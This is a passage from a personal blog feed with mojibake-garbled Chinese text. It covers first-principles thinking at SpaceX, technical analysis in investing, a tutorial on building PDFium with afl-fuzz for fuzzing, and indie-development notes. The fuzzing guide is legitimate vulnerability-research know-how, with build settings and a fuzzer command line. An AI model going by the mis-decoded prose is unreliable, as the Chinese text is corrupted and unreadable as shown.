å°±éœ€è¦ä¸€ä¸ªå…¨æ–°çš„å•†ä¸šæ¨¡å¼</p><p>ä¸‡ç»´é’¢ï¼šä½œä¸ºä¸€ä¸ªå‰ç‰©ç†å­¦å®¶ï¼Œæˆ‘å¯¹ç¬¬ä¸€æ€§åŸç†çš„ç¬¬ä¸€ååº”æ˜¯æœ€åŸºæœ¬çš„ç‰©ç†å®šå¾‹ï¼Œæ‰€ä»¥è°è·Ÿæˆ‘è¯´è¦ä»ç¬¬ä¸€æ€§åŸç†å‡ºå‘ã€é‡æ–°å»ºç«‹ä¸€å¥—æ–°ä¸œè¥¿ï¼Œæˆ‘æ·±è¡¨æ€€ç–‘ â€”â€” å› ä¸ºæˆ‘å°Šé‡äººç±»æ–‡æ˜ã€‚</p><p>SpaceX ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨ç¬¬ä¸€æ€§åŸç†</p><ol><li>èˆªå¤©ä¸æ˜¯ä¸€ä¸ªç«äº‰å……åˆ†æœ‰æ•ˆçš„å¸‚åœºï¼šèˆªå¤©åŸºæœ¬æ˜¯ NASA å„æ–­çš„é¢†åŸŸï¼ŒNASA è‡ªå·±åŸºæœ¬ä¸Šåªè´Ÿè´£è®¾è®¡å’Œç§‘å­¦ç ”ç©¶ï¼Œå®ƒä¼šæŠŠç«ç®­çš„åˆ¶é€ å·¥ç¨‹è½¬åŒ…ç»™å„ä¸ªå°å…¬å¸</li><li>NASA ç°åœ¨ä¸æ€ä¹ˆåˆ›æ–°ï¼šNASA åœ¨ç§‘å­¦æ¢ç´¢æ–¹é¢æ²¡é—®é¢˜ï¼Œä¸€ç›´åœ¨è¿›æ­¥ï¼Œä½†å®ƒå°±åƒå…¶ä»–å¤§å‹ä¼ä¸šä¸€æ ·ï¼Œå¾—äº†å¤§ä¼ä¸šç—…ã€‚æµç¨‹ä¼šè®©å…¬å¸ä¸€ç›´æŒ‰ç…§æƒ¯æ€§è¡Œäº‹</li></ol><p>ã€Šåƒç«ç®­ç§‘å­¦å®¶ä¸€æ ·æ€è€ƒã€‹ä¹¦ä¸­ï¼Œç“¦ç½—å°”åˆ†æäº† SpaceX ä½¿ç”¨ç¬¬ä¸€æ€§åŸç†çš„ 6 ä¸ªåŠæ³•</p><ul><li>å°½é‡ä¸å¤–åŒ…ï¼Œ80%çš„é›¶éƒ¨ä»¶è‡ªå·±ç”Ÿäº§</li><li>é‡‡è´­çš„æ–¹å¼æ›´åŠ çµæ´»ï¼šå¯èƒ½åˆ° ebayï¼ŒåºŸå“å‚å»ä¹°äºŒæ‰‹é›¶éƒ¨ä»¶</li><li>å’Œå¤§å¸‚åœºå¯¹æ¥ï¼šåˆ©ç”¨æ°‘ç”¨çš„äº§ä¸šé“¾åšç«ç®­ (å¯èƒ½æ˜¯æœ€é‡è¦çš„ä¸€ç‚¹)</li><li>å›æ”¶ï¼Œå°½é‡é‡å¤ä½¿ç”¨ç«ç®­</li><li>ç”¨äººä¸åªç”¨èˆªå¤©äººæ‰ï¼Œä¹Ÿåˆ°å¤§å¸‚åœºæ‰¾äººï¼šä»æ±½è½¦ã€æ‰‹æœºç­‰å¿«é€Ÿè¿­ä»£çš„é¢†åŸŸå¯»æ‰¾äººæ‰</li><li>â€œå¥¥å§†å¡å‰ƒåˆ€â€ï¼Œå°½é‡ç®€åŒ–åˆ¶é€ æµç¨‹</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸ªäººå¯¹æŠ€æœ¯åˆ†æçš„ä¸€äº›ç†è§£</title>
    <link href="/cn/jishufenxi/"/>
    <url>/cn/jishufenxi/</url>
    
    <content type="html"><![CDATA[<ul><li><p>æŠ€æœ¯åˆ†æåˆ†ä¸‰ä¸ªå±‚æ¬¡ï¼šè¶‹åŠ¿è·Ÿéšã€æ”¯æ’‘&#x2F;é˜»åŠ›ï¼Œæ¨¡å¼è¯†åˆ«  (åˆ†å…ˆåé¡ºåºï¼Œé å‰çš„é‡è¦)ã€‚</p></li><li><p>é‡‘èæŠ•èµ„ä¸­çš„æŠ€æœ¯åˆ†æå·¥å…·æœ€ä¸»è¦çš„ä½œç”¨æ˜¯åŒºåˆ«å‡ºå“ªäº›æ ‡çš„ä¸å¯ä»¥äº¤æ˜“ï¼Œæ‰€è°“ä¸å¯ä»¥äº¤æ˜“å°±æ˜¯ä»æ¦‚ç‡ä¸Šè®²èƒœç®—ä¸ç†æƒ³ã€‚é¡ºåŠ¿äº¤æ˜“çš„èƒœç‡è¦è¿œè¿œè¶…è¿‡é€†åŠ¿äº¤æ˜“ï¼ŒæŠ€æœ¯åˆ†æå·¥å…·åˆ™å¯ä»¥å¸®æˆ‘ä»¬è¯†åˆ«å‡ºã€Œæ­£ç¡®çš„æ–¹å‘ã€ã€‚</p></li><li><p>ä¼ ç»ŸæŠ€æœ¯åˆ†æå¤šæ•°åˆ©ç”¨æ¨¡å¼è¯†åˆ«æˆ–è€…ç»Ÿè®¡å­¦çš„æ–¹æ³•æ¥è¯†åˆ«äº¤æ˜“æœºä¼šï¼Œè¿™äº›æ–¹æ³•æ²¡æ³•ä»åº•å±‚é€»è¾‘ä¸Šè¿›è¡Œå‰–æï¼Œåªæ˜¯åœ¨æ¦‚ç‡ä¸Šæœ‰ä¸€å®šä¼˜åŠ¿ç½¢äº†ï¼Œå®æˆ˜èµ·æ¥å°±æ˜¯æœ‰æ—¶çµéªŒæœ‰æ—¶ä¸çµéªŒäº†ã€‚</p></li><li><p>ä½†æŠ€æœ¯åˆ†æå¹¶ä¸æ˜¯æ¯«æ— ä»·å€¼ï¼Œå¦‚æœæŠŠå¸‚åœºçœ‹æˆæ˜¯ä¸€ä¸ªå¤æ‚ç³»ç»Ÿï¼Œå¤æ‚ç³»ç»Ÿçš„é‡è¦ç‰¹å¾åœ¨ä¸åŒå±‚çº§æ¶Œç°å‡ºåˆ†å½¢è‡ªç›¸ä¼¼ï¼Œä»åˆ†å½¢ç»“æ„ä¸Šåˆ†æåŸºç¡€å°±æ‰å®äº†å¾ˆå¤šã€‚</p></li><li><p>ä¼ ç»Ÿçš„æ³¢æµªç†è®ºæ˜¯å¯¹å¸‚åœºè¿›è¡Œåˆ†å½¢åˆ†æçš„ä¸€æ¬¡å°è¯•ï¼Œä½†å¹¶æ²¡æœ‰åˆ†æå‡ºåŸºæœ¬ç»“æ„ï¼Œå‡ºç°äº†åƒäººåƒæµªçš„ç°è±¡ï¼Œæ— æ³•ç²¾ç¡®çš„æŒ‡å¯¼äº¤æ˜“ã€‚</p></li><li><p>ç¼ ä¸­è¯´ç¦…ã€Œæå½ªã€å¤§å¸ˆçš„ ã€Œç¼ è®ºã€æœ‰äº†æ–°çš„è¿›å±•ï¼Œç¬”ã€çº¿æ®µã€ä¸­æ¢çš„è¯´æ³•ä»¤äººè€³ç›®ä¸€æ–°ï¼Œå¯æƒœå¤©å¦’è‹±æ‰ï¼Œå¤§å¸ˆå°šæœªå…¨é¢é˜è¿°ç†è®ºå°±ç¦»æˆ‘ä»¬è€Œå»ã€‚</p></li><li><p>å¦‚æœç ”ç©¶å¸‚åœºçš„æ—¶é—´é•¿äº†ï¼ŒåŸºæœ¬ä¸Šéƒ½ä¼šæ¶‰åŠåˆ° å¤æ‚ç³»ç»Ÿï¼Œè€—æ•£ç»“æ„ç†è®ºï¼Œæ··æ²Œç†è®º ç­‰æ–¹é¢çš„çŸ¥è¯†å»ã€‚æŠ€æœ¯åˆ†æåˆ°åé¢ï¼ŒåŸºæœ¬ä¼šæ¶‰åŠåˆ°æ˜¯å¸‚åœºåŸºæœ¬ç»“æ„å½¢æ€å’ŒåŠ¨åŠ›å­¦ã€‚</p></li><li><p>ã€Œä¸å­˜åœ¨å¯ä»¥ç»ˆç»“æ‰€æœ‰å‡†åˆ™çš„å‡†åˆ™ã€ï¼ŒæŠ€æœ¯åˆ†æå·¥å…·æ˜¯è®¾è®¡æ¥è§£é‡Šå¸‚åœºç°è±¡çš„ï¼Œä½†é‡‘èå¸‚åœºæ˜¯ä¸€ä¸ªå¤æ‚ç³»ç»Ÿï¼Œæˆ‘ä»¬éš¾ä»¥å¯¹å…¶è¡Œä¸ºè¿›è¡Œå»ºæ¨¡ï¼Œæ‰€ä»¥åˆ›é€ ä¸€ä¸ªå¯ä»¥è§£é‡Šæ‰€æœ‰å¸‚åœºç°è±¡çš„æ¨¡å‹åœ¨ç†è®ºä¸Šå°±æ˜¯è¡Œä¸é€šçš„ã€‚</p></li><li><p>æŠ€æœ¯åˆ†æå·¥å…·åªæ˜¯å°è¯•ç”¨ä¸€ä¸ªæ¨¡å‹æ¥è§£é‡Šå¸‚åœºè¡Œä¸ºï¼Œå®ƒä¸å…·å¤‡é¢„æµ‹å¸‚åœºèµ°åŠ¿çš„èƒ½åŠ›ã€‚å› æ­¤åªæ ¹æ®æŠ€æœ¯åˆ†æå·¥å…·æ¥è¿›è¡Œäº¤æ˜“æ˜¯ä¸å¯å–çš„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ›´å¤šç»´åº¦çš„ä¿¡æ¯ç»¼åˆåˆ¤æ–­ä»¥æé«˜æˆ‘ä»¬çš„èƒœç‡ã€‚è¿™äº›ä¿¡æ¯å¯èƒ½æ¶‰åŠåŸºæœ¬é¢ï¼Œè¡Œä¸ºç»æµå­¦ã€ç»æµå­¦ï¼Œæ”¿æ²»ç­‰è¯¸å¤šæ–¹é¢çš„çŸ¥è¯†ã€‚</p></li><li><p>æŠ€æœ¯åˆ†æçš„æ¨¡å‹åœ¨å¾ˆå¤šæ—¶å€™åªæ˜¯ä¸€ç§æ¨¡ç³Šçš„æ­£ç¡®ï¼Œåªæœ‰å¸‚åœºçš„èµ°åŠ¿å’Œæ¨¡å‹è§£é‡Šä¸€è‡´æ—¶æ‰ä»£è¡¨è§£é‡Šå¯èƒ½æ­£ç¡®ã€‚æŠ€æœ¯åˆ†æå·¥å…·å‘å‡ºä¿¡å·åªä»£è¡¨å¸‚åœºè¡Œæƒ…çš„å‘å±•å¯èƒ½æ¥åˆ°äº†ä¸€ä¸ªå…³é”®ç‚¹ï¼Œè¿™ä¸ªå…³é”®ç‚¹ä¹Ÿæ˜¯æ¨¡ç³Šçš„ã€‚</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨ afl-fuzz fuzz pdfium</title>
    <link href="/cn/pdfium-fuzz.public/"/>
    <url>/cn/pdfium-fuzz.public/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‹è½½æºç "><a href="#ä¸‹è½½æºç " class="headerlink" title="ä¸‹è½½æºç "></a>ä¸‹è½½æºç </h2><p>å…ˆåœ¨ <a href="https://pdfium.googlesource.com/pdfium/">https://pdfium.googlesource.com/pdfium/</a> ä¸‹è½½æºç .</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">mkdir</span> repo<br><span class="hljs-built_in">cd</span> repo<br>gclient config --unmanaged https://pdfium.googlesource.com/pdfium.git<br>gclient <span class="hljs-built_in">sync</span><br><span class="hljs-built_in">cd</span> pdfium<br></code></pre></td></tr></table></figure><p>gclient å‘½ä»¤åœ¨ depot_tools ä¸­, éœ€è¦å®‰è£… å‚è€ƒä¸‹é¢çš„æ–‡ç« </p><p><a href="http://www.chromium.org/developers/how-tos/install-depot-tools">http://www.chromium.org/developers/how-tos/install-depot-tools</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git<br><span class="hljs-built_in">export</span> PATH=`<span class="hljs-built_in">pwd</span>`/depot_tools:<span class="hljs-string">&quot;<span class="hljs-variable">$PATH</span>&quot;</span><br></code></pre></td></tr></table></figure><p>ä¸»è¦gclient sync åŒæ­¥æ—¶éœ€è¦ç¿»å¢™ï¼Œå¯ä»¥ç®€å•çš„ä½¿ç”¨ç¯å¢ƒå˜é‡çš„æ–¹æ³•ã€‚</p><p><code>https_proxy=http://localhost:8118 gclient sync</code> ä¸‹è½½ download google storageè¿‡<br>ç¨‹ä¸­è¿˜ä¼šé‡åˆ°ä¸€ä¸ªç½‘ç»œé—®é¢˜ï¼Œéœ€è¦ç¼–å†™é…ç½®æ–‡ä»¶ ~&#x2F;.boto</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Boto]</span><br><span class="hljs-attr">proxy</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>  <span class="hljs-comment"># ä¸å¸¦ http://</span><br><span class="hljs-attr">proxy_port</span>= <span class="hljs-number">8118</span><br></code></pre></td></tr></table></figure><p><code>export NO_AUTH_BOTO_CONFIG=~/.boto</code></p><p>æºç åŒ…éå¸¸å¤§ï¼Œå¤§æ¦‚æœ‰1Gå¤šï¼Œéœ€è¦è€å¿ƒç­‰å¾…ã€‚</p><h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><p>ç¼–è¯‘éœ€è¦ä½¿ç”¨ ubuntu æˆ–è€… Debian ç³»ç»Ÿï¼Œå…¶ä»–ç³»ç»Ÿçš„ä¾èµ–é—®é¢˜è§£å†³èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œ<br>å¦‚æœæ˜¯ä¸Šé¢ä¸¤ç§æ“ä½œç³»ç»Ÿçš„è¯ï¼Œæœ‰è„šæœ¬è‡ªåŠ¨å®‰è£…ä¾èµ–ã€‚</p><p><code>./build/install-build-deps.sh</code></p><p>å®‰è£…å®Œæ‰€ä»¥ä¾èµ–åå°±å¯ä»¥å¼€å§‹ç¼–è¯‘äº†ï¼Œé¦–å…ˆè¦å…ˆç”Ÿæˆ gn æ–‡ä»¶ (2016 å¹´google æ”¾å¼ƒä½¿ç”¨åŸæ¥çš„ gyp ç¼–è¯‘æ–¹å¼)</p><p><code>gn args out/afl</code> ä¼šè°ƒç”¨vim ç¼–è¯‘å™¨ï¼Œ è¾“å…¥ä¸‹é¢çš„å†…å®¹</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-comment"># Build arguments go here.</span><br><span class="hljs-comment"># See &quot;gn args &lt;out_dir&gt; --list&quot; for available build arguments.</span><br><span class="hljs-attr">use_goma</span> = <span class="hljs-literal">false</span> <span class="hljs-comment"># Googlers only. Make sure goma is installed and running first.</span><br><span class="hljs-attr">is_debug</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment"># Enable debugging features.</span><br><br><span class="hljs-attr">pdf_use_skia</span> = <span class="hljs-literal">true</span> <span class="hljs-comment"># Set true to enable experimental skia backend.</span><br><span class="hljs-attr">pdf_use_skia_paths</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment"># Set true to enable experimental skia backend (paths only).</span><br><br><span class="hljs-attr">pdf_enable_xfa</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment"># Set false to remove XFA support (implies JS support).</span><br><span class="hljs-attr">pdf_enable_v8</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment"># Set false to remove Javascript support.</span><br><span class="hljs-attr">pdf_is_standalone</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment"># Set for a non-embedded build.</span><br><span class="hljs-attr">is_component_build</span> = <span class="hljs-literal">false</span> <span class="hljs-comment"># Disable component build (must be false)</span><br><span class="hljs-attr">v8_static_library</span> = <span class="hljs-literal">true</span><br><br><span class="hljs-attr">clang_use_chrome_plugins</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment"># Currently must be false.</span><br><span class="hljs-attr">use_sysroot</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment"># Currently must be false on Linux, but entirely omitted on windows.</span><br><br><span class="hljs-attr">use_afl</span> = <span class="hljs-literal">true</span><br><span class="hljs-comment">#is_asan = true</span><br><span class="hljs-attr">enable_nacl</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">optimize_for_fuzzing</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">symbol_level</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ ASAN ç¼–è¯‘ä¼šæŠ¥é”™ï¼Œæš‚æ—¶ä¸å¼€å¯ï¼Œæ¥ä¸‹æ¥è¦è§£å†³ afl çš„é—®é¢˜äº†ï¼Œ pdfium çš„ third_party<br>ä¸­ä¸åŒ…å« afl-fuzz çš„æºä»£ç ï¼Œéœ€è¦åˆ° chromium.googlesource.com é¡¹ç›®ä¸‹è½½ã€‚<br>chromium é¡¹ç›®æ”¯æŒ libfuzzer å’Œ afl-fuzzï¼Œåªè¦ä½¿ç”¨å¼€å…³ï¼Œ <code>use_libfuzzer = true</code><br>æˆ–è€… <code>use_afl = true</code> å³å¯æ‰“å¼€ã€‚</p><p>è¦ç¼–è¯‘ç”Ÿæˆ pdfium_test, å¿…é¡»æŒ‡å®š pdf_is_standalone &#x3D; true, pdfium æºç ä»“åº“ä¸­æ²¡æœ‰<br>afl-fuzz çš„ä»£ç ï¼Œéœ€è¦è‡ªå·±ä¸‹è½½ã€‚</p><p><a href="https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/">https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/</a></p><p>å¯ä»¥ç›´æ¥ä¸‹è½½ .tgz æ–‡ä»¶<br><a href="https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz">https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz</a></p><p>ä¸‹è½½åå°†æºç  copy åˆ° ~&#x2F;repo&#x2F;pdfium&#x2F;third_party&#x2F;afl ä¸­, ä½¿ç”¨ <code>ninja -C out/afl</code> ç¼–è¯‘æ•´ä¸ªé¡¹ç›®ã€‚</p><p>ä½¿ç”¨ <code>is_debug=false</code> å¯ä»¥æ˜æ˜¾æé«˜fuzzing é€Ÿåº¦ï¼Œåº”è¯¥å¼€å¯ã€‚å¦å¤–ä¸€ä¸ªæ¯”è¾ƒæœ‰ç”¨çš„æ˜¯<br><code>symbol_level</code>, è®¾ç½® symbol_level&#x3D;1 å¯ä»¥æ·»åŠ å¿…è¦çš„è°ƒè¯•ç¬¦å·ï¼Œä¾¿äºgdbè°ƒè¯•ã€‚</p><p>åœ¨ç¼–è¯‘ skia backend æ”¯æŒæ—¶ï¼Œéœ€è¦é¢å¤–å¤„ç†ï¼Œ ä½¿ç”¨ C++14</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">use_cxx11</span> = <span class="hljs-literal">false</span> <br></code></pre></td></tr></table></figure><h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><p>éšç€ chromium ä»£ç çš„æ›´æ–°ï¼Œ afl æºç ç¼–è¯‘å‡ºç°äº†ä¸€äº›å°é—®é¢˜ï¼Œéœ€è¦å¤„ç†ã€‚</p><p>src&#x2F;third_party&#x2F;afl&#x2F;patches&#x2F;0001-fix-build-with-std-c11.patch</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/afl-fuzz.c b/afl-fuzz.c</span><br><span class="hljs-comment">index 01b4afef0ecc..f0d564a33037 100644</span><br><span class="hljs-comment">--- a/afl-fuzz.c</span><br><span class="hljs-comment">+++ b/afl-fuzz.c</span><br><span class="hljs-meta">@@ -23,7 +23,9 @@</span><br> #define AFL_MAIN<br> #define MESSAGES_TO_STDOUT<br> <br><span class="hljs-addition">+#ifndef _GNU_SOURCE</span><br> #define _GNU_SOURCE<br><span class="hljs-addition">+#endif</span><br> #define _FILE_OFFSET_BITS 64<br> <br> #include &quot;config.h&quot;<br><span class="hljs-comment">diff --git a/types.h b/types.h</span><br><span class="hljs-comment">index 784d3a7a286d..d24d1fdd97e8 100644</span><br><span class="hljs-comment">--- a/types.h</span><br><span class="hljs-comment">+++ b/types.h</span><br><span class="hljs-meta">@@ -78,7 +78,7 @@</span> typedef int64_t  s64;<br> #define STRINGIFY(x) STRINGIFY_INTERNAL(x)<br> <br> #define MEM_BARRIER() \<br><span class="hljs-deletion">-  asm volatile(&quot;&quot; ::: &quot;memory&quot;)</span><br><span class="hljs-addition">+  __asm__ volatile(&quot;&quot; ::: &quot;memory&quot;)</span><br> <br> #define likely(_x)   __builtin_expect(!!(_x), 1)<br> #define unlikely(_x)  __builtin_expect(!!(_x), 0)<br></code></pre></td></tr></table></figure><p>afl-fuzz çš„ä½¿ç”¨å’Œå…¶ä»–é¡¹ç›®ä¸€æ ·ã€‚åˆå§‹çš„ç§å­æ–‡ä»¶æœ‰å‡ ä¸ªåœ°æ–¹å¯ä»¥è·å–ï¼š</p><ul><li><a href="https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/">https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/</a></li><li><a href="https://github.com/mozilla/pdf.js/tree/master/test/pdfs">https://github.com/mozilla/pdf.js/tree/master/test/pdfs</a></li></ul><p><code>./afl-fuzz -M 01 -m 1024 -i /home/henices/input -o /home/henices/out -x /tmp/pdf.dict -- ./pdfium_test @@</code></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li><li><a href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf">https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md</a></li><li><a href="https://fuzzing-project.org/tutorial2.html">https://fuzzing-project.org/tutorial2.html</a></li><li><a href="https://blog.chromium.org/2012/04/fuzzing-for-security.html">https://blog.chromium.org/2012/04/fuzzing-for-security.html</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md">https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md</a></li><li><a href="https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF">https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF</a></li><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html</a></li><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Learn In Public æ‘˜è¦</title>
    <link href="/en/learn_in_public/"/>
    <url>/en/learn_in_public/</url>
    
    <content type="html"><![CDATA[<p>a habit of creating <strong>learning exhaust</strong>  </p><ul><li>Write blogs and tutorials and cheatsheets.  </li><li>Speak at meetups and conferences.  </li><li>Ask and answer things on Stackoverflow or Reddit.  <ul><li>Avoid the walled gardens like Slack and Discord, theyâ€™re not public.</li></ul></li><li>Make Youtube videos or Twitch streams.  </li><li>Start a newsletter.  </li><li>Draw cartoons (people loooove cartoons!)</li></ul><p>Whatever your thing is, make the thing you wish you had found when you were learning.  </p><ul><li><strong>Donâ€™t judge your results by â€œclapsâ€ or retweets or stars or upvotes</strong></li></ul><p>Oh you think youâ€™re done? Donâ€™t stop there:  </p><ul><li>Enjoyed a coding video? Reach out to the speaker&#x2F;instructor and thank them, and ask questions.  </li><li>Make PRâ€™s to libraries you use.  </li><li>Make your own libraries no one will ever use.  </li><li>Clone stuff you like, from scratch, to see how they work.  </li><li>Teach workshops.  </li><li>Go to conferences and summarize what you learned.</li></ul><p>The subheading under this rule would be: <strong>Try your best to be right, but donâ€™t worry when youâ€™re wrong.</strong>  </p><ul><li>People think you suck? Good. You agree. Ask them to explain, in detail, why you suck  </li><li>You want to just feel good or you want to <strong>be</strong> good?  <ul><li>Then go away and prove them wrong. Of course, if they get abusive block them.</li></ul></li></ul><p>At some point youâ€™ll get some support behind you. People notice genuine learners. Theyâ€™ll want to help you.  </p><ul><li>Donâ€™t tell them, but they just became your mentors.  </li><li>This is very important: Pick up what they put down  </li><li>Because you learn in public. By teaching you, they teach many.</li></ul><p>source: <a href="https://www.swyx.io/learn-in-public/">https://www.swyx.io/learn-in-public/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å›¾æ‹‰é¼è°ˆç‹¬ç«‹å¼€å‘</title>
    <link href="/cn/tulading/"/>
    <url>/cn/tulading/</url>
    
    <content type="html"><![CDATA[<p>ç‹¬ç«‹å¼€å‘</p><ul><li>é•¿æœŸç»´æŠ¤äº§å“ï¼šæ¶ˆè´¹è€…æ„¿æ„ä¸ºé•¿æœŸç»´æŠ¤çš„äº§å“ä¹°å•ï¼Œæ—§äº§å“æ²¡æœ‰æ·»åŠ æ–°åŠŸèƒ½ä¹Ÿç”¨æ–°å·¥å…·é“¾é‡æ–°ç¼–è¯‘ä¸€æ¬¡</li><li>åªå¼€å‘è‡ªå·±ä½¿ç”¨çš„äº§å“ï¼šè¯„ä¼°æœªæ¥å‡ å¹´è‡ªå·±æ˜¯å¦ä½¿ç”¨äº§å“ï¼Œä½œä¸ºæ˜¯å¦å¯åŠ¨äº§å“å¼€å‘çš„é‡è¦å› ç´ </li><li>å¤–åŒ… + ç‹¬ç«‹å¼€å‘ åŒé©±åŠ¨<ul><li>ç”¨å¤–åŒ…çš„æ”¶å…¥å¹³æ»‘ç‹¬ç«‹å¼€å‘çš„æ”¶å…¥æ³¢åŠ¨</li><li>åœ¨äº§å“å¼€å‘ç“¶é¢ˆæœŸï¼Œåˆ©ç”¨å¤–åŒ…åˆºæ¿€ï¼Œæ‰“å¼€æ€è·¯</li></ul></li></ul><p>é¡¹ç›®ç®¡ç†</p><ul><li>ç«‹é¡¹æµç¨‹: å…ˆè®°ä¸‹ ideaï¼Œå†·å´ä¸€æ®µæ—¶é—´åå¦‚æœæœ‰æ€è·¯å°±ç»§ç»­å®Œå–„ä¸€ä¸‹ ideaï¼Œç›´åˆ°æŸå¤©è¿˜æ˜¯æƒ³åšï¼Œæ¥ç€å°±å¼€å§‹åŠ¨æ‰‹</li><li>æ²¡æœ‰å¸‚åœºåˆ†æï¼Œæ²¡æœ‰ç”¨æˆ·åˆ†æï¼Œåªæœ‰åˆ†é˜¶æ®µå®Œæˆçš„ 1.0ã€2.0 â€¦ ç‰ˆæœ¬</li><li>1.0 ç‰ˆæœ¬ä¸ºè‡ªå·±å¼€å‘ï¼Œåªå¼€å‘æœ€æ ¸å¿ƒçš„åŠŸèƒ½ï¼Œ2-n é€šè¿‡ç”¨æˆ·çš„åé¦ˆå®Œå–„äº§å“</li></ul><p>å·¥ä½œæ¨¡å¼</p><ul><li>å……åˆ†åˆ©ç”¨çµæ´»æ€§ï¼Œåœ¨å®¶å’Œåœ¨å¤–å·¥ä½œçš„æ—¶é—´å¤§è‡´æ˜¯ 2:1</li><li>å®šæœŸä¸è®¾è®¡å¸ˆç¢°å¤´ï¼Œæ¯å‘¨2-3 